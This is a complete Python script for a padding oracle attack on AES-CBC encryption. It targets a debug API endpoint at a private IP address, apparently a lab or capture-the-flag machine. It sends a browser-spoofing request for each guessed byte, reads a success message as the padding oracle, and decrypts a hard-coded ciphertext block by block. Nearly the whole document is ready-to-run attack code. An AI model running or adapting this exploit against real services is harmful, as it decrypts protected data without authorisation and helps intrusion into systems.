import requests
from binascii import unhexlify, hexlify

BASE_URL = "http://10.10.227.104:8080/api/debug"
CIPHERTEXT_HEX = "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4"

BLOCK_SIZE = 16

HEADERS = {
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

def padding_oracle(cipher_hex: str):
    """Return True if the server indicates valid padding."""
    url = f"{BASE_URL}/{cipher_hex}"
    try:
        r = requests.get(url, headers=HEADERS, timeout=1)
        return "Custom authentication success" in r.text
    except requests.RequestException:
        return False

def decrypt_block(prev_block: bytes, curr_block: bytes):
    """Decrypt a single AES-CBC block."""
    intermediate = [0] * BLOCK_SIZE
    recovered = [0] * BLOCK_SIZE

    prefix = bytearray(prev_block)

    for pad_len in range(1, BLOCK_SIZE + 1):
        found = False
        for guess in range(256):
            mod_block = bytearray(prefix)
            # Apply known intermediate values
            for j in range(1, pad_len):
                mod_block[-j] = intermediate[-j] ^ pad_len
            # Apply guess for current byte
            mod_block[-pad_len] = guess

            test_cipher = bytes(mod_block) + curr_block
            if padding_oracle(hexlify(test_cipher).decode()):
                intermediate[-pad_len] = guess ^ pad_len
                recovered[-pad_len] = intermediate[-pad_len] ^ prev_block[-pad_len]
                found = True
                break

        if not found:
            print(f"[!] Failed to find padding for byte {pad_len}")
            break

    return bytes(recovered)

if __name__ == "__main__":
    cipher_bytes = unhexlify(CIPHERTEXT_HEX)
    blocks = [cipher_bytes[i:i+BLOCK_SIZE] for i in range(0, len(cipher_bytes), BLOCK_SIZE)]
    recovered_plaintext = b""

    for i in range(1, len(blocks)):
        print(f"[*] Decrypting block {i}/{len(blocks)-1}")
        recovered_plaintext += decrypt_block(blocks[i-1], blocks[i])

    print("[+] Recovered plaintext (raw):", recovered_plaintext)
    try:
        print("[+] UTF-8 decoded:", recovered_plaintext.decode("utf-8"))
    except UnicodeDecodeError:
        print("[!] Plaintext contains non-printable bytes")
